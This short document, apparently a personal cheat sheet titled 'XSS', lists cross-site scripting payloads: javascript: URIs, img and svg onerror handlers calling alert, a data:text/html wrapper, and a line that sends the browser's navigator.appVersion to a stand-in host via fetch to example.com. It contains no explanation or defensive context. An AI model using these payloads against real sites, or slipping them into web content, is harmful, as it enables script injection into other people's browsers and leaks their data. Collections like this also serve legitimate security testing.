# XSS


#data:text/html,<a href="javascript:'<img src=e onerror=alert()>';">click</a>

#<a href='fetch("//example.com?"+navigator.appVersion)'>test</a>

#<a href="javascript:{alert(00)confirm(00)}">POC</a>


<xml:namespace prefix="t">
<svg><style>&lt;img/src=x onerror=alert(document.domain)// </b>
